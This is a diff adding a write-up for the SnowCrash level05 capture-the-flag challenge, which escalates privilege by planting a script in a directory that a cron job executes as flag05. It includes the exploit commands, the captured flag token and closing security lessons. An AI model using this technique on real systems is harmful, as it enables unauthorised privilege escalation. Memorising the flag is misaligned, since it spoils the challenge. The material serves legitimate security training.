@@ -1,0 +1,106 @@
+# SnowCrash Level05 - Exploitation Writeup
+
+## Overview
+Level05 exploits a scheduled cron job running with elevated privileges to execute arbitrary commands and retrieve the flag.
+
+## Discovery Process
+
+### 1. Initial Investigation
+First, I checked the mail directory for any clues:
+```bash
+cd /var/mail/
+cat level05
+```
+
+Found a cron job entry:
+```
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
+
+This reveals that:
+- A cron job runs **every 2 minutes**
+- It executes `/usr/sbin/openarenaserver` as user **flag05**
+- This gives us a potential privilege escalation vector
+
+### 2. Analyzing the Script
+Examined the `openarenaserver` script:
+```bash
+cat /usr/sbin/openarenaserver
+```
+
+Content:
+```bash
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+```
+
+**Key findings:**
+- The script iterates through all files in `/opt/openarenaserver/`
+- Executes each file with `bash -x` (with flag05 privileges)
+- Deletes the file after execution
+- Has a 5-second CPU time limit
+
+### 3. Exploitation Strategy
+Since we can write files to `/opt/openarenaserver/` and they'll be executed as flag05, we can create a script that:
+1. Runs `getflag` with flag05 privileges
+2. Redirects output to a readable location
+
+## Exploitation Steps
+
+### 1. Create the Exploit Script
+```bash
+cd /opt/openarenaserver/
+vim script.sh
+```
+
+Script content:
+```bash
+#!/bin/sh
+/bin/getflag > /tmp/flag05
+```
+
+**Note:** Output is redirected to `/tmp/flag05` instead of `/home/level05/flag05` because `/tmp/` is world-writable and more reliable for this exploit.
+
+### 2. Make Script Executable
+```bash
+chmod +x script.sh
+```
+
+### 3. Wait for Cron Execution
+The cron job runs every 2 minutes. I monitored the directory:
+```bash
+ls  # Repeatedly checked until script.sh disappeared
+```
+
+Once the file disappears, it means the cron job executed and deleted it.
+
+### 4. Retrieve the Flag
+```bash
+cd /tmp/
+cat flag05
+```
+
+## Result
+```
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+```
+
+## Flag
+**viuaaale9huek52boumoomioc**
+
+## Vulnerability Explanation
+This level demonstrates a **privilege escalation via cron job misconfiguration**:
+- The cron job executes scripts from a world-writable directory
+- Any user can place executable scripts in `/opt/openarenaserver/`
+- Scripts are executed with flag05 privileges
+- This allows unprivileged users to execute commands as flag05
+
+## Security Lessons
+1. **Never execute arbitrary files from world-writable directories** with elevated privileges
+2. **Restrict write permissions** on directories used by privileged cron jobs
+3. **Validate and sanitize** any files before execution
+4. **Use absolute paths** and proper ownership checks in automated scripts
